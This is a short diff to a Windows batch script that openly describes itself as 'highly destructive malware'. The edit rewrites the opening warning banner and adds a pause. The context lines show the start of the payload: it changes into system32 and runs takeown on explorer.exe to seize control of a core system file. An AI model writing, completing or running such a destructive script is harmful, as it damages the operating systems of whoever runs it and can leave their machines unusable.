@@ -1,5 +1,10 @@
 @echo off 
-echo your about to run a malware if you got send this close and delete it immediately! if your in virtualmachine press any key
+echo ==========================================================
+echo WARNING: You are about to execute a highly destructive malware.
+echo DO NOT proceed unless you fully understand the consequences.
+echo Close this file and delete it immediately if you received it.
+echo ==========================================================
+pause
 pause
 cd C:\windows\system32
 takeown /f C:\windows\explorer.exe
